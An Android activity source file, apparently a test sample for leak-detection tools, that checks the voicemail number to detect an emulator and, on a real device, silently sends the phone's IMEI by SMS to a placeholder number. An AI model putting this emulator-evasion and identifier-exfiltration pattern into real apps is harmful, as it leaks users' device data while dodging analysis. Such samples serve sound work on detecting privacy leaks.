package com.example.newedtester;




import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import android.view.Menu;
import android.widget.TextView;



public class MainActivity extends Activity {
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		TextView txtStatus;
		

		String status = "Can't Detect";
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		txtStatus = (TextView) findViewById(R.id.txtStatus);
		TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
		
	     /*Line1 = tm.getLine1Number();
	     Subscriber = tm.getSubscriberId();*/
	    String Voicemail = tm.getVoiceMailNumber();
	   
	    int a = Voicemail.compareTo("+15552175049"); 
	  
	     if (a==0)
	     {
	     	status = " \tVoicemail: Emulator";
	     }
	     else
	     {
	    	 TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
	        	String imei = telephonyManager.getDeviceId(); 
	        	
				SmsManager sm = SmsManager.getDefault();
		    	String number = "+49 1234";
		    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
	 
	    	 status = " \tVoicemail:Device";
	     }
		txtStatus.setText(status);

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}